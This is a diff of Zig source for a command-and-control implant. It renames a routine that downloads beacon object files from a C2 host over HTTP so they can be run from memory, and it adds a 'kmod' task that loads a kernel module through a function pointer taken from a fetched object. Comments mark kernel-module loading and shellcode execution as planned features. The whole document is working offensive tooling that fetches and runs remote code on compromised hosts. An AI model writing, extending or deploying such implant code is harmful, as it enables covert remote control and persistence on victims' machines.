@@ -20,60 +20,62 @@ const ImplantActions = struct {
   kmodLoader: ?*const fn (mod_name: [*:0]const u8) callconv(.C) c_int = null,
 
   pub fn attachFunctionality(self: *Self, bofObj: bof.Object) void {
-      std.log.info("Function pointer name: {s}", .{@typeName(ImplantActions)});
 
-      const ptr = bofObj.getProcAddress("kmodLoader");
-      if(ptr != null) {
-          self.kmodLoader = @ptrCast(@alignCast(ptr));
+      std.log.info("Implant's functionality:\n", .{});
+      const fields = @typeInfo(Self).Struct.fields;
+      inline for (fields) |field| {
+         std.debug.print("{s}\n", .{field.name});
       }
+
+      self.kmodLoader = @ptrCast(@alignCast(bofObj.getProcAddress("kmodLoader")));
   }
 };
 
 var implant_actions: ImplantActions = .{};
 
-fn fetchBofContent(allocator: std.mem.Allocator, state: *State, bof_uri: []const u8) ![]const u8 {
+fn fetchBlob(allocator: std.mem.Allocator, state: *State, blob_uri: []const u8) ![]const u8 {
 
-    const uri = try std.fmt.allocPrint(allocator, "http://{s}{s}", .{ c2_host, bof_uri });
+    const uri = try std.fmt.allocPrint(allocator, "http://{s}{s}", .{ c2_host, blob_uri });
     defer allocator.free(uri);
 
-    const bof_url = try std.Uri.parse(uri);
+    const blob_url = try std.Uri.parse(uri);
 
     var server_header_buffer: [1024]u8 = undefined;
-    var bof_req = try state.http_client.open(.GET, bof_url, .{ .server_header_buffer = &server_header_buffer });
-    defer bof_req.deinit();
+    var blob_req = try state.http_client.open(.GET, blob_url, .{ .server_header_buffer = &server_header_buffer });
+    defer blob_req.deinit();
 
-    try bof_req.send();
-    try bof_req.wait();
+    try blob_req.send();
+    try blob_req.wait();
 
-    if (bof_req.response.status != .ok) {
-        std.log.err("fetchBofContent: Expected response status '200 OK' got '{} {s}'", .{
-            @intFromEnum(bof_req.response.status),
-            bof_req.response.status.phrase() orelse "",
+    if (blob_req.response.status != .ok) {
+        std.log.err("[fetchBlob] Expected response status '200 OK' got '{} {s}'", .{
+            @intFromEnum(blob_req.response.status),
+            blob_req.response.status.phrase() orelse "",
         });
         return error.NetworkError;
     }
 
-    const bof_content_type = bof_req.response.content_type orelse {
+    const blob_content_type = blob_req.response.content_type orelse {
         std.log.err("Missing 'Content-Type' header", .{});
         return error.NetworkError;
     };
 
-    if (!std.ascii.eqlIgnoreCase(bof_content_type, "application/octet-stream")) {
+    if (!std.ascii.eqlIgnoreCase(blob_content_type, "application/octet-stream")) {
         std.log.err(
             "Expected 'Content-Type: application/octet-stream' got '{s}'",
-            .{bof_content_type},
+            .{blob_content_type},
         );
         return error.NetworkError;
     }
 
-    const bof_content = try allocator.alloc(u8, @intCast(bof_req.response.content_length.?));
-    errdefer allocator.free(bof_content);
+    const blob_content = try allocator.alloc(u8, @intCast(blob_req.response.content_length.?));
+    errdefer allocator.free(blob_content);
 
-    const n = try bof_req.readAll(bof_content);
-    if (n != bof_content.len)
+    const n = try blob_req.readAll(blob_content);
+    if (n != blob_content.len)
         return error.NetworkError;
 
-    return bof_content;
+    return blob_content;
 }
 
 const State = struct {
@@ -180,7 +182,7 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
     } else {
         // we need to fetch BOF file content from C2 sever
         const bof_path = root.object.get("path").?.string;
-        const bof_content = try fetchBofContent(allocator, state, bof_path);
+        const bof_content = try fetchBlob(allocator, state, bof_path);
         defer allocator.free(bof_content);
 
         bof_to_exec = try bof.Object.initFromMemory(bof_content);
@@ -333,9 +335,9 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
         defer parsed.deinit();
 
         // check type of task to execute:
-        // bof - execute bof
+        // bof - fetch and execute bof
         // cmd - execute builtin command (like: sleep <sec>; release_persistent_bofs)
-        // TODO: mod - load and execute chosen kernel module
+        // TODO: kmod - fetch and load kernel module
         // TODO: bin - execute chosen shellcode
         var root = parsed.value;
         const task = root.object.get("name").?.string;
@@ -356,17 +358,19 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
                     .launcher_error_code = @abs(@intFromError(err)) - 1000,
                 });
             };
-            // tasked for custom command execution?
-        } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
-            std.log.info("Executing builtin command: {s}", .{cmd_name});
-
-            // tasked to execute cmd:kmod
-            if (std.mem.eql(u8, cmd_name, "kmod")) {
-                if(implant_actions.kmodLoader != null) {
-                    _ = implant_actions.kmodLoader.?("mzet kmod loader here");
-                } else
-                    std.log.info("Kernel module loading not implemented", .{});
+        // tasked for kernel module loading?
+        } else if (std.mem.eql(u8, cmd_prefix, "kmod")) {
+            if(implant_actions.kmodLoader == null) {
+                std.log.info("Kernel module loading not implemented", .{});
+                return error.BadData;
             }
+
+            std.log.info("Loading kernel module: {s}", .{cmd_name});
+            _ = implant_actions.kmodLoader.?("mzet kmod loader here");
+
+        // tasked for custom command execution?
+        } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
+            std.log.info("Executing builtin command: {s}", .{cmd_name}); 
 
             // tasked to execute cmd:release_persistent_bofs
             if (std.mem.eql(u8, cmd_name, "release_persistent_bofs")) {
